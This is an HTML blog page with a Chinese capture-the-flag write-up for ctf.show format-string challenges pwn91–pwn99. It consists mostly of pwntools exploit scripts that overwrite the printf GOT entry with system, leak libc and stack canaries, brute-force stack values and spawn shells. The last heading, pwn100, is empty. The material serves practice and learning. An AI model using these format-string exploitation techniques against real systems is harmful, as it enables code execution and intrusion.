@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Wi1lings">
+
+
+
+
+
+<title>pwn入门（91~110） | Wi1lings</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Wi1lings&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Wi1lings&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">pwn入门（91~110）</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Wi1lings</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">March 4, 2025&nbsp;&nbsp;19:54:59</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="四、格式化字符串"><a href="#四、格式化字符串" class="headerlink" title="四、格式化字符串"></a>四、格式化字符串</h2><h3 id="pwn91"><a href="#pwn91" class="headerlink" title="pwn91"></a>pwn91</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28126</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;../code/pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">daniu = <span class="number">0x804B038</span></span><br><span class="line">p.sendline(fmtstr_payload(<span class="number">7</span>, &#123;daniu:<span class="number">6</span>&#125;))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="pwn92"><a href="#pwn92" class="headerlink" title="pwn92"></a>pwn92</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%s</span><br></pre></td></tr></table></figure>
+
+<h3 id="pwn93"><a href="#pwn93" class="headerlink" title="pwn93"></a>pwn93</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">选<span class="number">7</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="pwn94"><a href="#pwn94" class="headerlink" title="pwn94"></a>pwn94</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28233</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;../code/pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x6</span></span><br><span class="line">sys_addr = <span class="number">0x8048400</span></span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(offset, &#123;printf_got:sys_addr&#125;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="pwn95"><a href="#pwn95" class="headerlink" title="pwn95"></a>pwn95</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28235</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;../code/pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = p32(printf_got) + <span class="string">b&#x27;%6$s&#x27;</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">printf_addr = u32(p.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>, printf_addr)</span><br><span class="line"></span><br><span class="line">libcbase = printf_addr - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = fmtstr_payload(<span class="number">6</span>, &#123;printf_got:sys_addr&#125;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="pwn96"><a href="#pwn96" class="headerlink" title="pwn96"></a>pwn96</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">偏移为<span class="number">6</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="pwn97"><a href="#pwn97" class="headerlink" title="pwn97"></a>pwn97</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28257</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;../code/pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">11</span></span><br><span class="line">check = <span class="number">0x804B040</span></span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(offset, &#123;check:<span class="number">1</span>&#125;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="pwn98"><a href="#pwn98" class="headerlink" title="pwn98"></a>pwn98</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28174</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;../code/pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shell = elf.sym[<span class="string">&#x27;__stack_check&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload = <span class="string">&#x27;%15$x&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span> + p32(canary) + <span class="string">b&#x27;A&#x27;</span> * <span class="number">0xc</span> + p32(shell)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="pwm99"><a href="#pwm99" class="headerlink" title="pwm99"></a>pwm99</h3><blockquote>
+<p>盲打，提示了flag在栈上，那就一个个爆破吧</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;error&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">payload</span>):</span><br><span class="line">	io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28153</span>)</span><br><span class="line">	io.recv()</span><br><span class="line">	io.sendline(payload)</span><br><span class="line">	data = io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">	<span class="keyword">if</span> data.startswith(<span class="string">b&#x27;0x&#x27;</span>):</span><br><span class="line">		<span class="built_in">print</span>(p64(<span class="built_in">int</span>(data, <span class="number">16</span>)))</span><br><span class="line">	io.close()</span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	payload = <span class="string">&#x27;%&#123;&#125;$p&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">	leak(payload)</span><br><span class="line">	i += <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="pwn100"><a href="#pwn100" class="headerlink" title="pwn100"></a>pwn100</h3>
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Wi1lings</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2025/03/04/pwn%E5%85%A5%E9%97%A8%EF%BC%8891-110%EF%BC%89/">http://example.com/2025/03/04/pwn%E5%85%A5%E9%97%A8%EF%BC%8891-110%EF%BC%89/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/pwn-WP/"># pwn_WP</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2025/03/04/pwn%E5%85%A5%E9%97%A8%EF%BC%88111-134%EF%BC%89/">pwn入门（111~134）</a>
+            
+            
+            <a class="next" rel="next" href="/2025/03/04/pwn%E5%85%A5%E9%97%A8%EF%BC%881-90%EF%BC%89/">pwn入门（1~90）</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Wi1lings | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
